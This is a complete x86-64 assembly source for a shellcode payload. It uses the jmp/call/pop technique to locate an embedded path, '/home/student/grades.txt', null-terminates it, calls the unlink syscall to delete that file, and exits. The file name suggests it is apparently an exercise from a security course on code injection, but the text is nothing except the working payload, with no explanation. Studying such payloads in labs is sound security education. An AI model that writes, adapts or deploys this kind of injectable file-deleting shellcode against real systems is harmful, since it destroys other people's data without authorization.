#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	24

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq %rcx
	xorq %rax, %rax
	movb %al, (STRLEN)(%rcx)
	movb $SYS_unlink, %al
	movq %rcx, %rdi
	syscall

	xorq	%rax,%rax		/* get a 64-bit zero value */
	movb    $SYS_exit,%al		/* set up the syscall number */
	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
	syscall				/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING